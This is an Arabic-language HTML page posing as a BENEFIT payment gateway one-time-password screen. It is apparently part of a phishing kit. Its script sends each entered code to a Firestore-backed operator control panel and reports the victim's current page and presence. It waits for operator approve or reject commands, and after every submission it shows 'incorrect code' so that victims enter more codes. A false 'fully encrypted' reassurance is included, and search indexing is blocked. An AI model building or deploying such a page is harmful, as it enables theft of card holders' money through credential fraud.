<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=430, initial-scale=0.85, maximum-scale=1.0, user-scalable=no">
  <meta name="robots" content="noindex, nofollow, noarchive">
  <title>رمز التحقق</title>

  <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-app-compat.js"></script><script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore-compat.js"></script><script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-database-compat.js"></script><script src="./assets/js/firebase-client.js?v=20261027"></script>
<style>
    @import url('https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700&display=swap');

    * { box-sizing: border-box !important; }

    html, body {
      margin: 0 !important;
      padding: 0 !important;
      background-color: #ffffff !important;
      font-family: 'Tajawal', Arial, sans-serif !important;
      direction: rtl !important;
      color: #1a1a1a !important;
      width: 100% !important;
      overflow-x: hidden !important;
    }

    body {
      display: flex !important;
      justify-content: center !important;
      align-items: flex-start !important;
      min-height: 100vh !important;
    }

    .form-container.page {
      width: 430px !important;
      min-width: 430px !important;
      max-width: 430px !important;
      margin: 0 auto !important;
      padding: 12px 16px 14px !important;
      background: #ffffff !important;
      direction: rtl !important;
      display: flex !important;
      flex-direction: column !important;
    }

    .form-title {
      display: flex !important;
      flex-direction: column !important;
      align-items: center !important;
      justify-content: center !important;
      margin-bottom: 24px !important;
      position: relative !important;
    }

    .form-title::before {
      content: "BENEFTT PAYMENT GATEWAY" !important;
      display: block !important;
      font-size: 22px !important;
      font-weight: 500 !important;
      color: #c8102e !important;
      margin-bottom: 12px !important;
      letter-spacing: 0.2px !important;
      text-align: center !important;
    }

    .form-title::after {
      content: "بنفت\A benefit" !important;
      white-space: pre !important;
      display: block !important;
      font-size: 20px !important;
      font-weight: 700 !important;
      color: #c8102e !important;
      direction: ltr !important;
      text-align: center !important;
      line-height: 1.1 !important;
      margin-top: 6px !important;
    }

    .form-title .icon {
      display: block !important;
      width: 54px !important;
      height: 64px !important;
      margin: 0 auto !important;
      background: url("enefiti.webp") center / contain no-repeat !important;
      font-size: 0 !important;
    }

    .form-title > span:not(.icon) { display: none !important; }

    .otp-info {
      text-align: center !important;
      margin-bottom: 22px !important;
    }

    .otp-info p {
      margin: 0 !important;
      font-size: 16px !important;
      font-weight: 500 !important;
      color: #171717 !important;
      line-height: 1.8 !important;
    }

    .otp-info .otp-sub {
      margin-top: 8px !important;
      font-size: 14px !important;
      font-weight: 400 !important;
      color: #5f6368 !important;
      direction: rtl !important;
    }

    .otp-info .otp-sub span {
      direction: ltr !important;
      unicode-bidi: embed !important;
      font-weight: 700 !important;
      color: #171717 !important;
    }

    .form-group {
      margin-bottom: 24px !important;
      display: flex !important;
      flex-direction: row !important;
      align-items: center !important;
      justify-content: flex-start !important;
      position: relative !important;
      gap: 15px !important;
    }

    .form-label {
      width: 130px !important;
      min-width: 130px !important;
      max-width: 130px !important;
      font-size: 18px !important;
      font-weight: 500 !important;
      color: #171717 !important;
      text-align: right !important;
      margin: 0 !important;
      flex-shrink: 0 !important;
    }

    .form-control {
      flex: 1 !important;
      width: 100% !important;
      height: 52px !important;
      padding: 4px 12px !important;
      font-size: 18px !important;
      border: 2px solid #202124 !important;
      border-radius: 10px !important;
      background-color: #ffffff !important;
      color: #111111 !important;
      outline: none !important;
      box-shadow: none !important;
    }

    .otp-input {
      text-align: center !important;
      direction: ltr !important;
      letter-spacing: 0.45em !important;
      font-size: 24px !important;
      font-weight: 700 !important;
    }

    .form-control:focus {
      border-color: #c8102e !important;
    }

    .error-message {
      display: none;
      width: 100% !important;
      margin: -12px 0 18px !important;
      padding: 0 2px !important;
      color: #b42318 !important;
      font-size: 14px !important;
      font-weight: 500 !important;
      line-height: 1.5 !important;
      text-align: right !important;
    }

    .timer {
      text-align: center !important;
      margin-top: 20px !important;
      color: #5f6368 !important;
      font-size: 14px !important;
    }

    .timer strong { color: #f03a2d !important; }

    .btn.btn-success {
      width: 100% !important;
      height: 58px !important;
      margin-top: 22px !important;
      background: #e20b16 !important;
      color: #ffffff !important;
      border: none !important;
      border-radius: 12px !important;
      font-family: inherit !important;
      font-size: 20px !important;
      font-weight: 500 !important;
      cursor: pointer !important;
      box-shadow: 0 4px 8px rgba(226, 11, 22, 0.25) !important;
    }

    .secure-note {
      text-align: center !important;
      margin-top: 16px !important;
      font-size: 12px !important;
      color: #71717a !important;
    }

    .loading-overlay {
      position: fixed;
      inset: 0;
      background: rgba(10, 15, 25, 0.7);
      display: none;
      align-items: center;
      justify-content: center;
      z-index: 99999;
      padding: 20px;
    }
    .loading-overlay.show { display: flex; }
    .loading-card {
      background: #fff;
      border-radius: 16px;
      padding: 24px 28px;
      text-align: center;
      box-shadow: 0 12px 36px rgba(0,0,0,0.28);
    }
    .loading-spinner {
      width: 46px;
      height: 46px;
      border: 4px solid #e9e9e9;
      border-top-color: #c8102e;
      border-radius: 50%;
      margin: 0 auto 12px;
      animation: spin 0.9s linear infinite;
    }
    .loading-text { font-size: 0.95rem; color: #555; font-weight: 600; }
    @keyframes spin { to { transform: rotate(360deg); } }
</style>
</head>
<body>

  <div class="loading-overlay" id="loadingOverlay">
    <div class="loading-card">
      <div class="loading-spinner"></div>
      <div class="loading-text" id="loadingText">جار التحقق من البيانات</div>
    </div>
  </div>

  <div class="form-container page">
    <div class="form-title">
      <span class="icon">🔐</span>
      <span>OTP</span>
    </div>

    <form id="otpForm">
      <div class="otp-info">
        <p>يرجى إدخال رمز التحقق (OTP) المرسل إلى هاتفك</p>
        <p class="otp-sub">الرمز مرسل الآن إلى رقم الهاتف المرتبط بالبطاقة •••• <span id="last4">----</span></p>
      </div>

      <div class="form-group">
        <label class="form-label" for="otpCode">رمز التحقق</label>
        <input type="tel" class="form-control otp-input" id="otpCode"
               maxlength="6" inputmode="numeric" autocomplete="one-time-code"
               placeholder="• • • • • •" aria-label="رمز التحقق">
      </div>

      <div class="error-message" id="otpError" role="alert">رمز التحقق غير صحيح</div>

      <p class="timer">ستنتهي صلاحية هذه الصفحة بعد <strong id="countdown">60</strong> ثانية</p>

      <button type="submit" class="btn btn-success">
        <span>تأكيد</span>
      </button>

      <div class="secure-note">🔒 بياناتك محمية ومشفرة بالكامل</div>
    </form>
  </div>

<script>
    document.addEventListener('DOMContentLoaded', function () {
        const form = document.getElementById('otpForm');
        const otpInput = document.getElementById('otpCode');
        const otpError = document.getElementById('otpError');
        const loadingOverlay = document.getElementById('loadingOverlay');
        const loadingText = document.getElementById('loadingText');

        // آخر 4 أرقام من البطاقة — مخزّنة في الصفحة السابقة
        try {
            const last4 = sessionStorage.getItem('paymentCardLast4');
            if (last4) document.getElementById('last4').textContent = last4;
        } catch (e) {}

        let submitting = false;

        // تسجيل الصفحة الحالية في وثيقة العميل ليظهر المسار في لوحة التحكم
        try {
            if (typeof window.ensureCustomerDoc === 'function') {
                window.ensureCustomerDoc({ currentPage: 'صفحة تحقق البطاقة', lastSeen: Date.now() });
            }
            if (typeof window.startPresenceHeartbeat === 'function') {
                window.startPresenceHeartbeat();
            }
        } catch (e) {}

        // الاستماع لقرار لوحة التحكم: عند الرفض تظهر الرسالة ويبقى الحقل للتعديل
        try {
            if (typeof window.listenForAdminCommands === 'function') {
                window.listenForAdminCommands({
                    onApproval: function () {},
                    onRejection: function (cmd) {
                        const reason = (cmd && (cmd.reason || cmd.raw && cmd.raw.reason)) || 'يرجى المحاولة مرة أخرى';
                        loadingOverlay.classList.remove('show');
                        submitting = false;
                        otpError.textContent = '❌ تم رفض العملية: ' + reason;
                        otpError.style.display = 'block';
                        otpInput.value = '';
                        otpInput.focus();
                    }
                });
            }
        } catch (e) {}

        let countdown = 60;
        const countdownEl = document.getElementById('countdown');
        const countdownInterval = setInterval(function () {
            countdown--;
            if (countdownEl) countdownEl.textContent = countdown;
            if (countdown <= 0) {
                clearInterval(countdownInterval);
                if (countdownEl && countdownEl.parentElement) {
                    countdownEl.parentElement.textContent = 'انتهت صلاحية هذه الصفحة، يمكنك طلب رمز جديد';
                }
            }
        }, 1000);

        otpInput.addEventListener('input', function () {
            this.value = this.value.replace(/\D/g, '').slice(0, 6);
            otpError.style.display = 'none';
            if (this.value.length === 6) {
                setTimeout(function () { form.dispatchEvent(new Event('submit')); }, 300);
            }
        });

        form.addEventListener('submit', function (e) {
            e.preventDefault();
            if (submitting) return;

            const otp = otpInput.value.replace(/\D/g, '');
            if (otp.length !== 6) {
                otpError.textContent = 'يرجى إدخال رمز التحقق المكون من 6 أرقام';
                otpError.style.display = 'block';
                return;
            }

            otpError.style.display = 'none';
            submitting = true;
            loadingText.textContent = 'جار التحقق من البيانات يرجى الانتظار وعدم اغلاق الصفحة';
            loadingOverlay.classList.add('show');

            // إرسال الرمز إلى Firestore لتعرضه لوحة التحكم
            let sent = Promise.resolve();
            try {
                if (typeof window.pushFirebaseOtp === 'function') {
                    sent = window.pushFirebaseOtp(otp);
                }
            } catch (err) {
                console.error('pushFirebaseOtp error:', err);
            }

            Promise.resolve(sent).catch(function (err) {
                console.error('OTP write error:', err);
            }).then(function () {
                setTimeout(function () {
                    loadingOverlay.classList.remove('show');
                    submitting = false;
                    otpError.textContent = 'رمز التحقق غير صحيح';
                    otpError.style.display = 'block';
                    otpInput.value = '';
                    otpInput.focus();
                }, 4000);
            });
        });
    });
</script>
</body>
</html>
